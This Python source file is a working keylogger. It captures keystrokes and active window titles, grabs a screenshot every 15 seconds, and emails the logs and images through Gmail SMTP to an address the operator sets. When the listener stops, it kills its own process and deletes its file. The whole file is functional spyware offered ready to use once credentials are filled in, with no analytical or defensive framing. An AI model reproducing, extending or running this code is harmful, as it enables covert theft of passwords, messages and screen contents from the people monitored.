import logging
import os
import platform
import smtplib
import socket
import threading
import time
import pyscreenshot
import win32gui
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

EMAIL_ADDRESS = "Replace with your Gmail address"  # Replace with your Gmail address
EMAIL_PASSWORD = "Replace with your Gmail App Password or the password you use"  # Replace with your Gmail App Password or the password you use

SEND_REPORT_EVERY = 40  # in seconds


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password
        self.screenshot_counter = 1
        self.current_window = ""

    def appendlog(self, string):
        self.log += string

    def get_active_window(self):
        try:
            window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            return window_title
        except Exception as e:
            return f"Error getting window title: {e}"

    def check_window_change(self):
        active_window = self.get_active_window()
        if active_window != self.current_window:  # Log only if the window title changes
            self.current_window = active_window
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.appendlog(f"\n[{timestamp}] [Active Window Changed]: {active_window}\n")

    def save_data(self, key):
        # Check for window change and log it with timestamp if needed
        active_window_logged = False
        active_window = self.get_active_window()
        if active_window != self.current_window:
            self.current_window = active_window
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.appendlog(f"\n[{timestamp}] [Active Window Changed]: {active_window}\n")
            active_window_logged = True

        # Capture the keypress without adding a timestamp for every character
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {str(key)} "

        # Append the keypress to the log, ensuring no redundant timestamps
        self.appendlog(current_key)

    def send_mail(self, email, password, message, screenshot_path=None):
        sender = email
        receiver = email  # You can set a different receiver if needed

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Report"
        msg.attach(MIMEText(message, 'plain'))

        # Attach screenshot if available
        if screenshot_path:
            try:
                with open(screenshot_path, 'rb') as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f"attachment; filename={screenshot_path}")
                    msg.attach(part)
                    print(f"Screenshot {screenshot_path} attached to email.")
            except Exception as e:
                print(f"Error while attaching screenshot: {e}")

        try:
            # Use Gmail's SMTP server
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()  # Start TLS for security
                server.login(email, password)
                text = msg.as_string()
                server.sendmail(sender, receiver, text)
                print("Email sent successfully")
        except Exception as e:
            print(f"Error: {e}")

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def take_screenshot(self):
        screenshot_path = f"screenshot_{self.screenshot_counter}.png"  # Unique filename for each screenshot
        try:
            img = pyscreenshot.grab()  # Capture the screenshot
            img.save(screenshot_path)  # Save it to the file
            print(f"Screenshot saved to {screenshot_path}")
            self.send_mail(self.email, self.password, "Here is a new screenshot.", screenshot_path)  # Send the screenshot via email
            os.remove(screenshot_path)  # Delete the screenshot after sending it
            print(f"Screenshot {screenshot_path} deleted after sending.")
            self.screenshot_counter += 1  # Increment counter for the next screenshot
        except Exception as e:
            print(f"Error while saving screenshot: {e}")

    def screenshot_interval(self):
        while True:
            self.take_screenshot()  # Take a screenshot and send it via email
            time.sleep(15)  # Wait for 10 seconds before the next screenshot

    def run(self):
        # Start the screenshot interval function in a separate thread
        threading.Thread(target=self.screenshot_interval, daemon=True).start()

        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is closed.')

        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " + os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print('File is closed.')


keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
